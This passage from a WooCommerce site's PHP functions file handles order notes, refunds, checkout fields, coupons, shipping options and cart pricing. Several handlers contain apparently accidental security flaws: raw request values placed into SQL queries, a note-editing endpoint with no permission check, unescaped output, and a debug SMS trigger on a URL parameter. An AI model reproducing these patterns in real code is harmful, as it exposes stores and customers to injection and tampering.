            $order_id = $_POST['order_id'];
        }
        if ($order_id == '') {
            //
        } else {
            $order = wc_get_order($order_id);
            if ($notes = $order->get_customer_order_notes()) {
                $html .= '<ol class="commentlist notes">';
                foreach ($notes as $note) {
                    $html .= '<li class="comment note">
                        <div class="comment_container">
                            <div class="comment-text">
                                <p class="meta">';
                    $html .= sbr_date(strtotime($note->comment_date));

                    $html .= '</p>
                                <div class="description">';
                    $html .= wpautop(wptexturize($note->comment_content));
                    $html .= '</div>
                                <div class="clear"></div>
                            </div>
                            <div class="clear"></div>
                        </div>
                    </li>';
                }
                $html .= ' </ol>';
            }
        }
        echo $html;
        die();
    }

    add_action('wp_ajax_get_order_internal_notes_by_orderid', 'get_order_internal_notes_by_orderid');

    function get_order_internal_notes_by_orderid($order_id = '')
    {
        global $current_user;
        $html = '';
        if ($order_id == '') {
            $order_id = $_POST['order_id'];
        }
        if ($order_id == '') {
            //
        } else {
            $order_notes = wc_get_order_notes(array(
                'order_id' => $order_id,
                'orderby' => 'date_created_gmt',
                //'type' => 'internal'
            ));
            $html .= '<ol class="commentlist notes" style="text-align:left">';
            foreach ($order_notes as $order_note) {
                $added_by = $order_note->added_by;
                // Content
                $content = $order_note->content;
                $full_date = explode("T", $order_note->date_created);
                $innerstr = '';
                if ($added_by == $current_user->display_name) {
                    $innerstr = ' <a href="#" class="delete_note_listing" onclick="delete_order_note_mbt(jQuery(this));" role="button">Delete note</a> <a class="edit-note-mbt" onclick="toggleClassMbtEdit(jQuery(this));">Edit</a> <a class="cancel-note-mbt" onclick="toggleClassMbtEdit(jQuery(this));">Cancel</a> <a class="save-note-mbt" onclick="saveNoteMbt(jQuery(this));">save</a>';
                }
                //  print_r($full_date);
                $html .= '<li class="comment note" rel="' . $order_note->id . '"><div class="description">';
                $html .= '<div class="note_date_sbr">Date: ' . esc_html(sprintf(__('%1$s %2$s', 'woocommerce'), $order_note->date_created->date_i18n(wc_date_format()), $order_note->date_created->date_i18n(wc_time_format()))) . esc_html(sprintf(__(' by %s', 'woocommerce'), $order_note->added_by)) . $innerstr;


                $html .= '</div><span class="note-inner-mbt">Note:</span> <div class="div-editText" contentEditable>' . wptexturize($content) . '</div>';
                $html .= '
                        
                    </li></div>';
                //}
            }
            $html .= ' </ol>';
        }
        echo $html;
        die();
    }

    /*
 * refund log
 */
    add_action('woocommerce_order_refunded', 'action_woocommerce_order_refunded_sbr', 10, 2);

    // Do the magic
    function action_woocommerce_order_refunded_sbr($order_id, $refund_id)
    {

        $refunde_string = isset($_POST['line_item_totals']) ? $_POST['line_item_totals'] : '';
        if ($refunde_string != '') {
            $refund_reason = $_POST['refund_reason'];
            $refunde_strin2 = stripslashes($refunde_string);
            $refunded_items = json_decode($refunde_strin2);
            foreach ($refunded_items as $key => $ref) {
                if ($ref > 0) {
                    $item_id = $key;
                    $product_id = wc_get_order_item_meta($item_id, '_product_id', true);
                    if ($product_id != '') {
                        $refund_amount = $ref;
                        $event_data = array(
                            "order_id" => $order_id,
                            "item_id" => $item_id,
                            "product_id" => $product_id,
                            "event_id" => 13,
                            "note" => 'Refund Reason: ' . $refund_reason . ' Amount: $' . $refund_amount
                        );
                        // sb_create_log($event_data);
                    }
                }
            }
        }
    }

    /*
 * Woocommerce change order status on partial refunds
 */
    add_action('woocommerce_order_refunded', 'action_order_refunded_mbt', 10, 2);

    function action_order_refunded_mbt($order_id, $refund_id)
    {
        $refund_amount = isset($_POST['refund_amount']) ? $_POST['refund_amount'] : 0;
        $order = wc_get_order($order_id);
        $orderTotal = $order->get_total();
        if ($orderTotal > $refund_amount && $refund_amount > 0) {
            //$order->update_status("wc-partial-refunded");
        } else {
            $order->update_status("wc-refunded");
        }
    }

    add_filter("woocommerce_checkout_fields", "mbt_override_checkout_fields", 99);

    function mbt_override_checkout_fields($fields)
    {
        $fields['shipping']['shipping_first_name']['priority'] = 1;
        $fields['shipping']['shipping_last_name']['priority'] = 2;


        $fields['shipping']['shipping_company']['priority'] = 3;
        $fields['shipping']['shipping_country']['priority'] = 4;
        $fields['shipping']['shipping_state']['priority'] = 5;
        $fields['shipping']['shipping_address_1']['priority'] = 6;
        $fields['shipping']['shipping_address_2']['priority'] = 7;
        $fields['shipping']['shipping_city']['priority'] = 8;
        $fields['shipping']['shipping_postcode']['priority'] = 9;

        $fields['shipping']['shipping_first_name']['placeholder'] = 'First Name';
        $fields['shipping']['shipping_last_name']['placeholder'] = 'Last Name';
        $fields['shipping']['shipping_address_1']['placeholder'] = 'Address';
        $fields['shipping']['shipping_city']['placeholder'] = 'City / Town';
        $fields['shipping']['shipping_postcode']['placeholder'] = 'Postcode / zip';

        $fields['billing']['billing_email']['placeholder'] = 'Email';
        $fields['billing']['billing_first_name']['placeholder'] = 'First Name';
        $fields['billing']['billing_last_name']['placeholder'] = 'Last Name';
        $fields['billing']['billing_address_1']['placeholder'] = 'Address';
        $fields['billing']['billing_city']['placeholder'] = 'City / Town';
        $fields['billing']['billing_postcode']['placeholder'] = 'Postcode / zip';
        $fields['billing']['billing_phone']['placeholder'] = 'Phone';

        //$fields['shipping']['shipping_phone']['priority'] = 11;

        $fields['billing']['billing_email']['priority'] = 1;
        $fields['billing']['billing_first_name']['priority'] = 2;
        $fields['billing']['billing_last_name']['priority'] = 3;
        $fields['billing']['billing_phone']['priority'] = 4;
        $fields['billing']['billing_country']['priority'] = 5;
        $fields['billing']['billing_address_1']['priority'] = 6;
        $fields['billing']['billing_city']['priority'] = 7;
        $fields['billing']['billing_state']['priority'] = 8;
        $fields['billing']['billing_postcode']['priority'] = 9;
        return $fields;
    }

    add_filter('woocommerce_ship_to_different_address_checked', '__return_true');

    function crop_image_mbt($image)
    {

        $source = @imagecreatefrompng($image);

        $file = basename($image);
        $fileexploded = explode('.', $file);
        $arr = array();
        $file_name = isset($fileexploded[0]) ? $fileexploded[0] : '';
        if ($file_name != '' && $source !== false) {
            $source_width = imagesx($source);
            $source_height = imagesy($source);
            $width = 1800;
            $height = 1200;
            //if source width is greater than the 1 label width
            //if($width < $source_width){
            if ($source_width >= 5400) {
                //up to 3 columns
                for ($col = 0; $col < $source_width / $width; $col++) {
                    if ($col == 0) {
                        $randomFileNameSplit1 = $file_name . "_0.png";
                        $fn = sprintf($_SERVER['DOCUMENT_ROOT'] . "/downloads/labels/" . $randomFileNameSplit1, $col, 0);
                        $arr[] = $_SERVER['DOCUMENT_ROOT'] . "/downloads/labels/" . $randomFileNameSplit1;
                    } else if ($col == 1) {
                        $randomFileNameSplit2 = $file_name . "_1.png";
                        $fn = sprintf($_SERVER['DOCUMENT_ROOT'] . "/downloads/labels/" . $randomFileNameSplit2, $col, 0);
                        $arr[] = $_SERVER['DOCUMENT_ROOT'] . "/downloads/labels/" . $randomFileNameSplit2;
                    } else if ($col == 2) {
                        $randomFileNameSplit3 = $file_name . "_2.png";
                        $fn = sprintf($_SERVER['DOCUMENT_ROOT'] . "/downloads/labels/" . $randomFileNameSplit3, $col, 0);
                        $arr[] = $_SERVER['DOCUMENT_ROOT'] . "/downloads/labels/" . $randomFileNameSplit3;
                    }

                    $im = @imagecreatetruecolor($width, $height);
                    imagecopyresized($im, $source, 0, 0, $col * $width, 0 * $height, $width, $height, $width, $height);
                    imagepng($im, $fn);

                    //imagedestroy( $im );
                }
            }
        }

        return $arr;
    }

    add_action('wp_ajax_get_addon_orders_by_order_id', 'get_addon_orders_by_order_id');

    function get_addon_orders_by_order_id($order_id = '')
    {
        global $wpdb;
        $found = false;
        if ($order_id == '') {
            $order_id = $_REQUEST['order_id'];
        }
        $addOrder = '';
        $old_order_id = get_post_meta($order_id, 'old_order_id', true);
        if ($old_order_id != '') {
            $old_order_id_addon = get_post_meta($order_id, 'old_order_id_addon', true);
            if ($old_order_id_addon == '') {
                $sql = "select post_id from wp_postmeta where meta_key = 'old_order_id' AND meta_value=$old_order_id";
                $results = $wpdb->get_results($sql, 'ARRAY_A');
                if (count($results) > 0) {
                    $addOrder .= '<h3>Legacy Addon Orders</h3>';
                    foreach ($results as $res) {
                        if ($res['post_id'] != $order_id) {
                            $order_number = get_post_meta($res['post_id'], 'order_number', true);

                            $addOrder .= '<a target="_blank" href="' . get_edit_post_link($res['post_id']) . '">' . $order_number . '</a>';
                            $addOrder .= '<br />';
                            $found = true;
                        }
                    }
                }
            }
        }
        $sql2 = "select post_id from wp_postmeta where meta_key = 'parent_order_id' AND meta_value=$order_id";
        $results2 = $wpdb->get_results($sql2, 'ARRAY_A');
        if (count($results2) > 0) {
            $addOrder .= '<h3>Child Orders</h3>';
            foreach ($results2 as $res2) {
                $order_number = get_post_meta($res2['post_id'], 'order_number', true);
                $order_type = get_post_meta($res2['post_id'], 'order_type', true);
                $addOrder .= 'Order Type : ' . $order_type . ' => <a target="_blank" href="' . get_edit_post_link($res2['post_id']) . '">' . $order_number . '</a>';
                $addOrder .= '<br />';
                $found = true;
            }
        }
        echo $addOrder;
        if (!$found) {
            echo 'No Add Order Found';
        }
        die();
    }

    function woo_in_cart_mbt($product_id)
    {
        global $woocommerce;
        if (is_array($product_id)) {
            foreach ($woocommerce->cart->get_cart() as $key => $val) {
                $_product = $val['data'];

                if (in_array($_product->get_id(), $product_id)) {
                    return true;
                }
            }
            return false;
        } else {
            foreach ($woocommerce->cart->get_cart() as $key => $val) {
                // compatibility with WC +3
                $p_id = $val['data']->get_id(); // For version 3 or more

                if ($product_id == $p_id) {
                    return true;
                }
            }
            
            return false;
        }
    }

    /*
 * Rewrite rules for js widgets and sales
 */

    function custom_rewrite_rule_mbt_widget()
    {
        flush_rewrite_rules();
        add_rewrite_rule('^widget/([^/]*)/([^/]*)/([^/]*)/?', 'index.php?pagename=widget&bannerType=whitening&isArticle=0&campaignSlug=$matches[1]&bannerWidth=$matches[2]&bannerHeight=$matches[3]&isGiveaway=0', 'top');
        add_rewrite_rule('^widget/([^/]*)?', 'index.php?pagename=widget&bannerType=whitening&isArticle=0&campaignSlug=$matches[1]&bannerWidth=850&bannerHeight=250&isGiveaway=0', 'top');
        add_rewrite_rule('^widget', 'index.php?pagename=widget&bannerType=normal&isArticle=0&campaignSlug=&bannerWidth=773&bannerHeight=228&isGiveaway=0', 'top');

        add_rewrite_rule('^widget-article/([^/]*)/([^/]*)/([^/]*)/?', 'index.php?pagename=widget&bannerType=whitening&isArticle=1&campaignSlug=$matches[1]&bannerWidth=$matches[2]&bannerHeight=$matches[3]&isGiveaway=0', 'top');
        add_rewrite_rule('^widget-article/([^/]*)?', 'index.php?pagename=widget&bannerType=whitening&isArticle=1&campaignSlug=$matches[1]&bannerWidth=850&bannerHeight=250&isGiveaway=0', 'top');
        add_rewrite_rule('^widget-article', 'index.php?pagename=widget&bannerType=whitening&isArticle=1&campaignSlug=&bannerWidth=850&bannerHeight=250&isGiveaway=0', 'top');


        add_rewrite_rule('^widget-caripro/([^/]*)/([^/]*)/([^/]*)/?', 'index.php?pagename=widget&bannerType=caripro&isArticle=0&campaignSlug=$matches[1]&bannerWidth=$matches[2]&bannerHeight=$matches[3]&isGiveaway=0', 'top');
        add_rewrite_rule('^widget-caripro/([^/]*)?', 'index.php?pagename=widget&bannerType=caripro&isArticle=0&campaignSlug=$matches[1]&bannerWidth=773&bannerHeight=228&isGiveaway=0', 'top');
        add_rewrite_rule('^widget-caripro', 'index.php?pagename=widget&bannerType=caripro&isArticle=0&campaignSlug=&bannerWidth=773&bannerHeight=228&isGiveaway=0', 'top');

        add_rewrite_rule('^widget-caripro-article/([^/]*)/([^/]*)/([^/]*)/?', 'index.php?pagename=widget&bannerType=caripro&isArticle=1&campaignSlug=$matches[1]&bannerWidth=$matches[2]&bannerHeight=$matches[3]&isGiveaway=0', 'top');
        add_rewrite_rule('^widget-caripro-article/([^/]*)?', 'index.php?pagename=widget&bannerType=caripro&isArticle=1&campaignSlug=$matches[1]&bannerWidth=773&bannerHeight=228&isGiveaway=0', 'top');
        add_rewrite_rule('^widget-caripro-article', 'index.php?pagename=widget&bannerType=caripro&isArticle=1&campaignSlug=&bannerWidth=773&bannerHeight=228&isGiveaway=0', 'top');

        add_rewrite_rule('^sale/geha', 'index.php?pagename=geha-sale', 'top');
    }

    add_action('init', 'custom_rewrite_rule_mbt_widget', 10, 0);
    add_filter('query_vars', function ($query_vars) {
        $query_vars[] = 'campaignSlug';
        $query_vars[] = 'bannerWidth';
        $query_vars[] = 'bannerHeight';
        return $query_vars;
    });

    add_action('wp_ajax_old_affiliates_redirect_to_new_structure', 'old_affiliates_redirect_to_new_structure');
    add_action('wp_ajax_nopriv_old_affiliates_redirect_to_new_structure', 'old_affiliates_redirect_to_new_structure');
    function old_affiliates_redirect_to_new_structure()
    {
        $hashed_val = isset($_REQUEST['hashed_val']) ? $_REQUEST['hashed_val'] : '';
        if ($hashed_val != '') {

            $user = get_user_by('login',  $hashed_val);
            if ($user) {
                $affiliate_id = affiliate_wp()->affiliates->get_column_by('affiliate_id', 'user_id', $user->ID);
                if ($affiliate_id) {
                    echo $affiliate_id;
                    die();
                }
            }
        }
        echo 'error';
        die();
    }

    add_action('wp_ajax_change_qty_shipped_sbr', 'change_qty_shipped_sbr');

    function change_qty_shipped_sbr()
    {
        $item_id = isset($_POST['order_item_id']) ? $_POST['order_item_id'] : '';
        $order_qty = isset($_POST['order_qty']) ? $_POST['order_qty'] : '';
        if ($item_id == '') {
            echo 'failed';
            die();
        } else {
            addShipmentHistory($item_id, $order_qty, 'simple', '', date('Y-m-d'));
            echo 'success';
            die();
        }
    }

    // Create and display the custom field in product general setting tab
    add_action('woocommerce_product_options_general_product_data', 'add_custom_field_general_product_fields_mbt');

    function add_custom_field_general_product_fields_mbt()
    {
        global $post;

        echo '<div class="product_custom_field">';

        // Custom Product Checkbox Field
        woocommerce_wp_checkbox(array(
            'id' => '_disabled_for_coupons',
            'label' => __('Disabled for all coupons', 'woocommerce'),
            'description' => __('Disable this products from all coupon discounts', 'woocommerce'),
            'desc_tip' => 'true',
        ));
        woocommerce_wp_text_input(array(
            'id' => '_percentage_calculate',
            'label' => __('Discount Percentage', 'woocommerce'),
            'description' => __('Enter the discount in percentage or fixed price for regular price', 'woocommerce'),
            'desc_tip' => 'true',
        ));
        echo '</div>';
    }

    // Save the custom field and update all excluded product Ids in option WP settings
    add_action('woocommerce_process_product_meta', 'save_custom_field_general_product_fields_mbt', 10, 1);

    function save_custom_field_general_product_fields_mbt($post_id)
    {

        $current_disabled = isset($_POST['_disabled_for_coupons']) ? 'yes' : 'no';

        $disabled_products = get_option('_products_disabled_for_coupons');
        if (empty($disabled_products)) {
            if ($current_disabled == 'yes')
                $disabled_products = array($post_id);
        } else {
            if ($current_disabled == 'yes') {
                $disabled_products[] = $post_id;
                $disabled_products = array_unique($disabled_products);
            } else {
                if (($key = array_search($post_id, $disabled_products)) !== false)
                    unset($disabled_products[$key]);
            }
        }

        update_post_meta($post_id, '_disabled_for_coupons', $current_disabled);
        update_option('_products_disabled_for_coupons', $disabled_products);
    }

    // Make coupons invalid at product level
    add_filter('woocommerce_coupon_is_valid_for_product', 'set_coupon_validity_for_excluded_products', 12, 4);

    function set_coupon_validity_for_excluded_products($valid, $product, $coupon, $values)
    {
        $coupon_code = strtoupper($coupon->get_code());
        // exclude geha product and shipping protection product
        if ($product->get_id() == GEHA_PRODUCT_ID || $product->get_id() == SHIPPING_PROTECTION_PRODUCT) {
            return false;
        }
        
        if (in_array($coupon_code, WHILTE_LISTED_COUPONS) || is_coupon_in_white_listed_prefix($coupon_code)) {
            return $valid;
        }
        if (!count(get_option('_products_disabled_for_coupons')) > 0)
            return $valid;

        $disabled_products = get_option('_products_disabled_for_coupons');
        if (in_array($product->get_id(), $disabled_products))
           $valid = false;
        return $valid;
    }
    // Set the product discount amount to zero
    add_filter('woocommerce_coupon_get_discount_amount', 'zero_discount_for_excluded_products', 12, 5);

    function zero_discount_for_excluded_products($discount, $discounting_amount, $cart_item, $single, $coupon)
    {
        $coupon_code = strtoupper($coupon->get_code());
        if (in_array($coupon_code, WHILTE_LISTED_COUPONS) || is_coupon_in_white_listed_prefix($coupon_code)) {
            return $discount;
        }
        if (!count(get_option('_products_disabled_for_coupons')) > 0)
            return $discount;

        $disabled_products = get_option('_products_disabled_for_coupons');
        if (in_array($cart_item['product_id'], $disabled_products))
            $discount = 0;
        
        return $discount;

    }

    // disable coupons while saled 

    add_filter('woocommerce_coupon_is_valid_for_product', 'set_coupon_validity_for_sales', 12, 4);

    function set_coupon_validity_for_sales($valid, $product, $coupon, $values)
    {
        
        $disable_coupon = get_field('disable_coupon', 'option');
        if ($disable_coupon) {
            //if ($current_date > $datetime_start && $current_date < $datetime_end) {
            $valid = false;
        }
        return $valid;
    }

    add_filter('woocommerce_coupon_get_discount_amount', 'zero_discount_for_excluded_sales', 12, 5);

    function zero_discount_for_excluded_sales($discount, $discounting_amount, $cart_item, $single, $coupon)
    {

        $disable_coupon = get_field('disable_coupon', 'option');
        if ($disable_coupon) {
            $discount = 0;
        }
        return $discount;
    }

    /*
 * bulk kit ready
 */
    add_action('wp_ajax_bulk_kit_ready', 'bulk_kit_ready');

    function bulk_kit_ready()
    {
        $orders_list = $_POST['val'];
        if ($orders_list != '') {
            if (strpos($orders_list, ',') !== false) {
                $orders_list_exp = explode(',', $orders_list);
                foreach ($orders_list_exp as $order_item_id) {

                    if ($order_item_id != '') {

                        $order_item = new WC_Order_Item_Product($order_item_id);
                        $order_id = $order_item->get_order_id();
                        $product_id = $order_item->get_product_id();
                        $event_data = array(
                            "order_id" => $order_id,
                            "item_id" => $order_item_id,
                            "product_id" => $product_id,
                            "event_id" => 16,
                        );

                        sb_create_log($event_data);
                    }
                }
            }
        }
        echo 'success';
        die();
    }

    /*
 * change shipping method
 */
    function change_shipping_method_by_order_id($order, $buttontext = '', $buttonClass = '')
    {
        $shipping_arr = get_post_meta($order->get_id());
        $shippingMethodHTML = get_shipping_methods_by_country_code($shipping_arr['_shipping_country'][0]);
        
        $shipDropDownHtml = '';
        $shipping_method_id = 0;
        $shipping_method = '';
        foreach ($order->get_items('shipping') as $item_id => $item) {
            $tt = $item_id;
            $shipping_method = $item->get_name();
            $shipping_method_id = $item->get_instance_id(); // The method ID
        }

        if (is_array($shippingMethodHTML) && count($shippingMethodHTML) > 0) {
            $shipDropDownHtml = '<select class="select wc-enhanced-select" name="edit_shipping_inline" id="edit_shipping_inline">';
            $shipDropDownUPSHtml = '';
            $shipDropDownUSPSHtml = '';
            foreach ($shippingMethodHTML as $ins_id => $ship_method) {
                $sel = '';
                $tt = '';
                if ($shipping_method_id == $ins_id) {
                    $sel = 'selected';
                }
                $option = '<option value="' . $ins_id . '" data-price="' . $ship_method['cost'] . '" ' . $sel . ' data-itemid=' . $tt . '> ' . $ship_method['title'] . '</option>';
                if (getShipmentCarrierLabel($ins_id) == 'UPS') {
                    $shipDropDownUPSHtml .= $option;
                } else {
                    $shipDropDownUSPSHtml .= $option;
                }
                // $shipDropDownHtml .= '<option value="' . $ins_id . '" data-price="' . $ship_method['cost'] . '" ' . $sel . ' data-itemid=' . $tt . '> ' . $ship_method['title'] . '</option>';
            }
            $shipDropDownHtml .= '<optgroup label="USPS">';
            $shipDropDownHtml .= $shipDropDownUSPSHtml;
            $shipDropDownHtml .= '</optgroup>';
            $shipDropDownHtml .= '<optgroup label="UPS">';
            $shipDropDownHtml .= $shipDropDownUPSHtml;
            $shipDropDownHtml .= '</optgroup>';
            $shipDropDownHtml .= '</select>';
        }

        return $edit_shipping = '<div class="item_shipping_input flex-row-mbt" style="display:none;">' . $shipDropDownHtml . '<div class="button-parent-batch-print"><div class="btn_save"><button class="btn_edit_shipping" type="button" data-order_id="' . $order->get_id() . '">Save</button></div><div class="btn_cancel"><button class="btn_edit_shipping_cancel" type="button" style="">Cancel</button></div></div></div><a class="shipping_edit ' . $buttonClass . '" href="javascript:;" style="" data-shippingm="' . $shipping_method . '">' . $buttontext . '</a>';
    }

    /*
 * create zendesk ticket when order status is changed from pending payment to processing
 */

    //  function action_woocommerce_order_status_changed_pending_to_processing($this_get_id, $this_status_transition_from, $this_status_transition_to, $instance)
    function action_woocommerce_order_status_changed_pending_to_processing($this_get_id)
    {

        global $wpdb;
        if (get_post_meta($this_get_id, 'hfa_hsa', true) == 'yes') {
            $payment_profile_id = get_post_meta($this_get_id, '_wc_authorize_net_cim_credit_card_payment_token', true);
            $tblToken = $wpdb->prefix . 'woocommerce_payment_tokens';
            $payment_token_id = $wpdb->get_var("SELECT  token_id  FROM $tblToken WHERE token =  $payment_profile_id");
            if ($payment_token_id) {
                addPaymentTokenMetaSBR('hsa_fsa', 'yes', $payment_token_id);
            }
        }

        if (isset($_REQUEST['selected_status']) || isset($_REQUEST['order_status']) || isset($_REQUEST['woocommerce_pay'])) {
            $order = wc_get_order($this_get_id);
            //   if (($this_status_transition_from == 'wc-pending' || $this_status_transition_from == 'pending') && ($this_status_transition_to == 'wc-processing' || $this_status_transition_to == 'processing')) {
            create_zendesk_ticket_status_changed($order);
            //  }
        }
    }

    add_action('woocommerce_payment_complete', 'action_woocommerce_order_status_changed_pending_to_processing');
    /*
 * check the order note is for internal team
 */
    add_action('woocommerce_order_note_added', 'woocommerce_order_notes_notification_mbt', 10, 2);

    function woocommerce_order_notes_notification_mbt($comment_id, $instance)
    {

        if (isset($_REQUEST['order_note']) || (isset($_REQUEST['note']) && $_REQUEST['note'] != '')) {

            $is_customer = get_comment_meta($comment_id, 'is_customer_note', true);

            if ($is_customer != '1' && get_comment_author($comment_id) != 'WooCommerce') {

                update_post_meta($instance->get_id(), 'has_order_note', true);
            }
        }
    }

    add_action('wp_ajax_delete_order_note_mbt', 'delete_order_note_mbt');

    function delete_order_note_mbt()
    {


        if (!current_user_can('edit_shop_orders') || !isset($_POST['note_id'])) {
            wp_die(-1);
        }

        $note_id = (int) $_POST['note_id'];

        if ($note_id > 0) {
            wc_delete_order_note($note_id);
        }
        wp_die();
    }

    add_action('wp_ajax_saveNoteMbt', 'saveNoteMbt');

    function saveNoteMbt()
    {
        $note_id = (int) $_POST['note_id'];
        $note_text = $_POST['note_text'];

        if ($note_id > 0) {

            $commentdata = array('comment_ID' => $note_id, 'comment_content' => $note_text);
            echo wp_update_comment($commentdata, true);
        }
        wp_die();
    }

    /*
  Woo funnel builder force detelte cart items */
    add_filter('wfacp_enable_delete_item', 'do_not_display_mbt', 11, 2);

    function do_not_display_mbt($cart_item, $status)
    {
        if (is_checkout()) {
            if (!isset($cart_item['forced_by'])) {
                $status = true;
            }
        }
        //$status = true;
        return $status;
    }

    add_action('wp_ajax_woocommerce_ajax_add_to_cart_mbt', 'woocommerce_ajax_add_to_cart_mbt');
    add_action('wp_ajax_nopriv_woocommerce_ajax_add_to_cart_mbt', 'woocommerce_ajax_add_to_cart_mbt');

    function woocommerce_ajax_add_to_cart_mbt()
    {
        $_POST['action'] = 'woocommerce_add_order_item';
        $product_id = apply_filters('woocommerce_add_to_cart_product_id', absint($_POST['product_id']));
        $quantity = empty($_POST['quantity']) ? 1 : wc_stock_amount($_POST['quantity']);

        $passed_validation = apply_filters('woocommerce_add_to_cart_validation', true, $product_id, $quantity);
        $product_status = get_post_status($product_id);

        if ($passed_validation && WC()->cart->add_to_cart($product_id, $quantity, $variation_id) && 'publish' === $product_status) {

            do_action('woocommerce_ajax_added_to_cart', $product_id);

            if ('yes' === get_option('woocommerce_cart_redirect_after_add')) {
                wc_add_to_cart_message(array($product_id => $quantity), true);
            }
            // WC_AJAX :: get_refreshed_fragments();
            if (woo_in_cart_mbt(EXCLUSIVE_OFFER_2_CARIPRO_REPLACEMENT_BRUSH_HEADS) && woo_in_cart_mbt(TRAVEL_CASE_PRODUCT_ID) && woo_in_cart_mbt(ENAMEL_ARMOUR_30_DAY_PRODUCT_ID)) {
                echo 'pop-close';
            }
        } else {

            $data = array(
                'error' => true,
                'product_url' => apply_filters('woocommerce_cart_redirect_after_error', get_permalink($product_id), $product_id)
            );

            echo wp_send_json($data);
        }

        wp_die();
    }

    /*
  Twillio Send SMS
 */
    if (isset($_GET['twillio'])) {
        send_twilio_text_sms('+16363465155', 'Hello Amir we waiting for you, Abidoon Nadeem');
    }
    add_action('init', 'add_to_cart_custom_product_composite');

    function add_to_cart_custom_product_composite()
    {
        if (strpos($_SERVER['REQUEST_URI'], 'coupons') !== false) {

            $_POST['action'] = 'woocommerce_add_order_item';
        }
        if (isset($_REQUEST['mbt-add-to-cart'])) {

            $_POST['action'] = 'woocommerce_add_order_item';
        }
    }

    add_action('woocommerce_before_calculate_totals', 'add_custom_fees_mbt');

    /**
     * Add custom fee if more than three article
     * @param WC_Cart $cart
     */
    function add_custom_fees_mbt(WC_Cart $cart)
    {
        $sale_discount = 0;
        $sale_discount_geha = 0;
        $subscriber_exclusive_deals_discount = 0;
        $subtotal_excl_tax = $subtotal_incl_tax = 0; // Initializing

        // Loop though cart items
        foreach ($cart->get_cart() as $cart_item) {
            if(isset( $cart_item['line_subtotal'])){
                $subtotal_excl_tax += $cart_item['line_subtotal'];
                // Check if 'line_subtotal_tax' exists before adding it
                $subtotal_incl_tax += $cart_item['line_subtotal'] + (isset($cart_item['line_subtotal_tax']) ? $cart_item['line_subtotal_tax'] : 0);
            // $subtotal_incl_tax += $cart_item['line_subtotal'] + $cart_item['line_subtotal_tax'];
            }
        }
        foreach (WC()->cart->get_cart() as $cart_item) {
            $product = wc_get_product($cart_item['product_id']);
            $pid = $product->get_id();
            //  if ($product->get_type() == 'composite') {
            if (isset($cart_item['sale_discount'])) {
                $isStillOnSale = get_post_meta($pid, 'sale_page', true);
                if ($isStillOnSale == '1') {
                    $new_discount = (int) get_post_meta($pid, 'sale_page_discount', true);
                    if ($new_discount == '') {
                        $new_discount = 0;
                    }
                    $qty = $cart_item['quantity'];
                    $new_discount = $new_discount * $qty;
                    $sale_discount = $sale_discount + $new_discount;
                }
            }
            if (isset($cart_item['sale_discount_geha'])) {
                $isStillOnSaleGeha = get_post_meta($pid, 'sale_page_geha', true);
                if ($isStillOnSaleGeha == '1') {
                    $new_discount_geha = (int) get_post_meta($pid, 'sale_page_discount_geha', true);
                    if ($new_discount_geha == '') {
                        $new_discount_geha = 0;
                    }
                    $qty = $cart_item['quantity'];
                    $new_discount_geha = $new_discount_geha * $qty;
                    $sale_discount_geha = $sale_discount_geha + $new_discount_geha;
                }
            }
            if (isset($cart_item['subscriber_exclusive_deals_discount'])) {
                $isStillOnexclusivdeals = get_post_meta($pid, 'subscriber_exclusive_deals', true);

                if ($isStillOnexclusivdeals == '1') {
                    $new_subscriber_exclusive_deals_discount = (int) get_post_meta($pid, 'subscriber_exclusive_deals_discount', true);
                    if ($new_subscriber_exclusive_deals_discount == '') {
                        $new_subscriber_exclusive_deals_discount = 0;
                    }
                    $qty = $cart_item['quantity'];
                    $new_subscriber_exclusive_deals_discount = $new_subscriber_exclusive_deals_discount * $qty;
                    $subscriber_exclusive_deals_discount = $subscriber_exclusive_deals_discount + $new_subscriber_exclusive_deals_discount;
                }
            }
            // }
        }
        $bogo_quantity = 1;
        foreach ($cart->get_cart() as $hash => $cart_item) {
            $product = wc_get_product($cart_item['product_id']);
            $pid = $product->get_id();
            if (isset($cart_item['4_nightguards_package'])) {
                $reorder_price = (float) get_post_meta($pid, '4_nightguards_package', true);
                $cart_item['data']->set_price($reorder_price);
            }
            if (isset($cart_item['2_nightguards_package'])) {
                $reorder_price = (float) get_post_meta($pid, '2_nightguards_package', true);
                $cart_item['data']->set_price($reorder_price);
            }
            if (isset($cart_item['1_nightguards_package'])) {
                $reorder_price = (float) get_post_meta($pid, '1_nightguards_package', true);
                $cart_item['data']->set_price($reorder_price);
            }
            if (isset($cart_item['4_nightguards_package_3mm'])) {
                $reorder_price = (float) get_post_meta($pid, '4_nightguards_package', true);
                $cart_item['data']->set_price($reorder_price);
            }
            if (isset($cart_item['2_nightguards_package_3mm'])) {
                $reorder_price = (float) get_post_meta($pid, '2_nightguards_package', true);
                $cart_item['data']->set_price($reorder_price);
            }
            if (isset($cart_item['1_nightguards_package_3mm'])) {
                $reorder_price = (float) get_post_meta($pid, '1_nightguards_package', true);
                $cart_item['data']->set_price($reorder_price);
            }
            if (isset($cart_item['any_whitening_system'])) {
                $reorder_price = (float) get_post_meta($pid, 'any_whitening_system', true);
                $cart_item['data']->set_price($reorder_price);
            }


            /**************************************************** New Prices **************************************/

            if (isset($cart_item['4_nightguards_package_new'])) {
                $reorder_price = (float) get_post_meta($pid, '4_nightguards_package_new', true);
                $cart_item['data']->set_price($reorder_price);
            }
            if (isset($cart_item['2_nightguards_package_new'])) {
                $reorder_price = (float) get_post_meta($pid, '2_nightguards_package_new', true);
                $cart_item['data']->set_price($reorder_price);
            }
            if (isset($cart_item['1_nightguards_package_new'])) {
                $reorder_price = (float) get_post_meta($pid, '1_nightguards_package_new', true);
                $cart_item['data']->set_price($reorder_price);
            }
            if (isset($cart_item['4_nightguards_package_3mm_new'])) {
                $reorder_price = (float) get_post_meta($pid, '4_nightguards_package_new', true);
                $cart_item['data']->set_price($reorder_price);
            }
            if (isset($cart_item['2_nightguards_package_3mm_new'])) {
                $reorder_price = (float) get_post_meta($pid, '2_nightguards_package_new', true);
                $cart_item['data']->set_price($reorder_price);
            }
            if (isset($cart_item['1_nightguards_package_3mm_new'])) {
                $reorder_price = (float) get_post_meta($pid, '1_nightguards_package_new', true);
                $cart_item['data']->set_price($reorder_price);
            }

            /*****************************************New Prices ==============End***********************************/

            if (isset($cart_item['rdh_sale_price'])) {
                $reorder_price = (float) $cart_item['rdh_sale_price'];
                $cart_item['data']->set_price($reorder_price);
            }
            if (isset($cart_item['geha_sale_price'])) {
                $geha_price = (float) $cart_item['geha_sale_price'];
                $cart_item['data']->set_price($geha_price);
            }
